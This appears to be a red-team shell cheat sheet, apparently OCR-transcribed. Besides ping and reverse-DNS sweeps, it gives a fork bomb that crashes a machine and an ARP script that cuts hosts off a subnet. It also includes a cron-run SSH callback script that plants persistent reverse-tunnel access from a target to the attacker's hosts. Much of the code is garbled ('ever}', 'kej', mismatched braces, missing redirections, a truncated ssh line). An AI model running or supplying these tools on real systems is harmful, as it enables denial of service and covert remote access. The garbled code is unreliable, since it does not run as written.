# Scripts

### Ping Sweep
```
for x in {1..254..1};do ping -c 1 1.1.1.$x | grep "64 b" | cut -d " " -f4 ips.txt; done
```

### Automated Domain Name Resolve Bash Script
```
#!bin/bash
echo "Enter Class C Range: i.e. 192.168.3"
read range
for ip in {1..254..1}; do
host $range.$ip | grep "name pointer" | cut -d " " -f5
done
```

### Fork Bomb

`:(){:|:&};:`

### DNS Reverse Lookup

`for ip in {1..254..1}; do dig -x 1.1.1.$ip | grep $ip dns.txt; done;`

### IP Banning Script

```
#!bin/sh
# This script bans anu IP in the 192.168.0.1 subnet strting st 2
# It Assumes 1 is the router and does not ban IPs .20 .21 .22
i = 2
while [ $i -le 253]
do
  if [ $i -ne 20 -a $i -ne 21 -a  $i -ne 22]; then
      echo "BANNED: arp -s 192.168.1.$i"
      arp -s 192.168.1.$i 00:00:00:00:00:0a
  else
      echo "IP NOT BANNED: 192.168.1.$i ------------------------"
      echo "-----------------------------------------------------"
  fi
  i=`expr $i +1`
done
```

### SSH callback script

Set up script in crontab to callback ever} X minutes. Highlj recommend JOU set up a generic user on red team computer (with no shell privs). Script will use the private kej (located on callback source computer) to connect to a public key (on red team computer). Red teamer connects to target via a local SSH session (in the example below, use #ssh -p4040 localhost)

```
#!/bin/sh
# script located on callback source computer (target)
killall ssh /dev/null 2 &1
sleep 5
REMLIS=4040
REMUSR=user
HOSTS=''domainl.com domain2.com domain3.com''
for LIVEHOST in $HOSTS;
do
  COUNT = $(ping -c2 $LIVEHOST | grep 'recieved' | awk -F ',' '{print $2}' | awk '{print $1}')
  if [[$COUNT -gt 0]]; then
    ssh -R $

ssh -R $(REMLIS}:localhost:22 -i
"/home/$(REMUSR}/.ssh/id rsa" -N $(LIVEHOST} -1 $(REMUSR}
:i
```
